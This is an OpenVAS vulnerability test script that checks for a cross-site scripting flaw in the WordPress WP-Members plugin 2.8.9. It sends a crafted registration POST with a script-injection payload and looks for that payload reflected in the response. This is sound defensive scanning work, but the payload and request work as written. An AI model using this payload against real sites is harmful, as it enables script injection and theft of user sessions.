###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_wp_members_mult_xss_vuln.nasl 34237 2014-01-09 17:04:49Z Jan$
#
# WordPress WP-Members Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804059";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6750 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-07-18 11:56:47 +0200 (Tue, 18 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-01-09 17:04:49 +0530 (Thu, 09 Jan 2014)");
  script_name("WordPress WP-Members Multiple Cross Site Scripting Vulnerabilities");

  tag_summary =
"This host is installed with Wordpress WP-Members Plugin and is prone to
multiple cross site scripting vulnerabilities.";

  tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.";

  tag_insight =
"Flaws are due to input sanitation errors in multiple GET and POST parameter.";

  tag_impact =
"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.

Impact Level: Application";

  tag_affected =
"Wordpress WP-Members Plugin version 2.8.9, Other versions may also be affected.";

  tag_solution =
"Upgrade to version Wordpress WP-Members Plugin 2.8.10 or later,
For updates refer to http://wordpress.org/plugins/wp-members";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "impact" , value : tag_impact);

  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2014010044");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2014/Jan/29");
  script_xref(name : "URL" , value : "http://wordpress.org/plugins/wp-members/changelog");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:http_port)){
  exit(0);
}

## Construct the attack request
url = dir + '/wp-login.php?action=register';

postData = 'user_login=&user_email=&first_name=%27"--></style></script>'+
           '<script>alert(document.cookie)</script>&last_name=&addr1=&addr2=&city'+
           '=&thestate=&zip=&country=&phone1=&redirect_to=&wp-submit=Register';

sndReq = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", get_host_name(), "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postData), "\r\n",
                "\r\n", postData, "\r\n");

## Send request and receive the response
rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq, bodyonly:FALSE);

## Confirm exploit worked by checking the response
if(rcvRes =~ "HTTP/1\.. 200" && '><script>alert(document.cookie)</script>' >< rcvRes
          && '>Register' >< rcvRes)
{
  security_message(http_port);
  exit(0);
}
